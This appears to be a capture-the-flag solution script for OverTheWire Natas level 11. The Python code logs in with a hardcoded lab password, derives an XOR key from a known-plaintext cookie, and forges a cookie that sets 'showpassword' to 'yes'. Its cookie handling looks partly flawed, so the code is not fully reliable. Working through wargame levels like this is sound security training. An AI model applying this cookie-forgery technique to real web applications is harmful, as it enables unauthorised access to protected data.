# exploit.

import requests
import base64
import json
from requests.auth import HTTPBasicAuth

url = 'http://natas11.natas.labs.overthewire.org'
auth_data = HTTPBasicAuth('natas11', 'U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK')
r = requests.post(url, auth = auth_data)

print("[*] Status code: " + str(r.status_code))
cookies_dictionary = r.cookies.get_dict()
old_cookie = cookies_dictionary['data']
print("[*] Old Cookie (url_encoded): " + str(old_cookie))

# The cookie value is url-encoded (%3D).
# By replacing the last 3 characters with '=', we have a base64 decryption.
old_cookie_list = list(old_cookie)
for i in range(0, len(old_cookie_list)):
    if i == len(old_cookie_list)-3: 
        old_cookie_list[i] = '='
        old_cookie_list[i+1] = '\0'
        old_cookie_list[i+2] = '\0'
        break
old_cookie = ''.join(old_cookie_list)
print("[*] Old Cookie (url_decoded): " + str(old_cookie))

old_cookie = base64.b64decode(old_cookie)
print("[*] Old Cookie: " + str(old_cookie))

old_data = {"showpassword":"no", "bgcolor":"#ffffff"}
old_data = json.dumps(old_data).encode('utf-8').replace(b" ", b"")
print("[*] Old cookie data: " + str(old_data))
        
# XOR decrypt.
def XOR_decrypt(data, cookie):
    secret_handshake = ""
    for i in range(0, len(data)):
        secret_handshake += str(chr(cookie[i] ^ data[i % len(data)]))
    return secret_handshake

# XOR encrypt.
def XOR_encrypt(data, secret_handshake):
    cookie = ""
    for i in range(0, len(data)):
        cookie += str(chr(data[i] ^ secret_handshake[i % len(secret_handshake)]))
    cookie = base64.encodebytes(cookie.encode('utf-8'))
    return cookie

# Find pattern in string.
def repeats(string):
    for x in range(1, len(string)):
        substring = string[:x]
        if substring * (len(string)//len(substring))+(substring[:len(string)%len(substring)]) == string:
            return substring

# We extracted the key.
secret_handshake = XOR_decrypt(old_cookie, old_data)
print("[*] Secret Handshake: " + str(secret_handshake))
secret_handshake = repeats(secret_handshake)
secret_handshake_bytes = bytes(secret_handshake, 'utf-8') # needs to have the same type as 'new_data'.
print("[*] Secret handshake pattern: " + str(secret_handshake))

# This is the new cookie.
new_data = {"showpassword":"yes", "bgcolor":"#ffffff"}
new_data = json.dumps(new_data).encode('utf-8').replace(b" ", b"")

# Here's what we are doing. 
# At first, we had: old_data ^ old_cookie = secret_handshake
# Now, we have: new_data ^ secret_handshake = new_cookie

new_cookie = XOR_encrypt(new_data, secret_handshake_bytes)
new_cookie = new_cookie.decode('utf-8')
print("[*] - New Cookie: ",new_cookie, "   - Type:       ", type(new_cookie))

# Now that we've got the new cookie, we have to 
# make a new request to the web server.
print("----------------------------------------")
print("[*] Making a request with the new cookie.")
request_cookie = {'data': str(list(new_cookie))}
r = requests.post(url, auth = auth_data, cookies = request_cookie)
print("[*] Status Code: " + str(r.status_code))
print("[*] Page Source: " + str(r.text))


